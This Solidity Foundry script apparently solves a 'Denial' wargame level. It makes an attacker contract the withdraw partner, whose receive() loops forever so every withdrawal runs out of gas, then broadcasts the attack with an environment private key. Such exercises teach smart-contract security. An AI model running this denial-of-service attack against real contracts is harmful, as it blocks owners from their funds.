//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";
contract DenialAttack {
  Denial denialInstance = Denial(payable(0xDB62dec9a0aE77b5053FFC58FADff5de276cd5d9));

  constructor() {
    denialInstance.setWithdrawPartner(address(this));
  }
  function attackDenial() external {
    denialInstance.withdraw();
  }

  receive() external payable {
      while (true) {}
  }

}
contract DenialSolution is Script {
  
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY")); 
    DenialAttack denialAttackInstance = new DenialAttack();
    denialAttackInstance.attackDenial();
    vm.stopBroadcast();
  }
}